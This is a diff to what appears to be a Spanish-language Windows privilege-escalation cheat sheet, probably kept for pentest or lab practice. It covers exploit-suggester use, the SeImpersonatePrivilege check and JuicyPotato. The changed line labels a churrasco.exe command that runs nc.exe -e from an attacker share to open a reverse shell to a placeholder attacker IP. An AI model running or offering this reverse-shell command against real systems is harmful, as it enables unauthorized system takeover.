@@ -42,7 +42,7 @@ python2 windows-exploit-suggester -d (archivo descargado) -i systeminfo.txt
 
 // privilegios whoami /priv
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled >>> juicipotato privilege escalation (churrasco.exe para sistemas antiguos) (https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/)
-churrasco.exe "\\<ip atacante>\recurso\nc.exe -e <ip atacante> <puerto>"
+reverse shell: churrasco.exe "\\<ip atacante>\recurso\nc.exe -e <ip atacante> <puerto>"
 
 
 ######## transferir archivos de linux a windows ###########
